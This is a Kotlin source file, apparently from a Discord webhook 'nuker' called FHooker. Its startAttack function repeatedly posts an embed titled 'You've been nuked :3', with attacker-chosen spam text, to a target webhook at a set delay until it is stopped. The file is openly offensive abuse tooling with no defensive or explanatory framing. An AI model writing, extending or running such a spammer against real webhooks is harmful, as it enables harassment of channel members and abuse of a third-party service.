package idk.bluecross.fhooker.logic

import idk.bluecross.fhooker.Globals
import idk.bluecross.fhooker.util.log
import java.awt.Color
import java.net.URL
import kotlin.concurrent.thread

var timerThr: Thread? = null // don't understand kotlin coroutines so I'll use threads


fun startAttack() {
    Globals.attackingRn = true;
    var discord = DiscordApi(Globals.webhook)
    var logo = object {}.javaClass.getResource("bbra.jpg")
    timerThr = thread(start = true) {
        try {
            val discord = discord
            val text = Globals.spamText
            discord.clearEmbeds()
            discord.addEmbed(
                DiscordApi.EmbedObject()
                    .setTitle("You've been nuked :3")
                    .setDescription("FHooker by Bluecross")
                    .setColor(Color.RED)
                    .addField("You are L <3", text, false)
            )
            while (timerThr != null && Globals.attackingRn && !timerThr!!.isInterrupted && timerThr!!.isAlive) {
                discord.execute()
                log("tried to send at ${Globals.webhook}")
                Thread.sleep(Globals.spamDelay.toLong())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

fun stopAttack() {
    Globals.attackingRn = false;
    timerThr?.interrupt()
    timerThr = null
}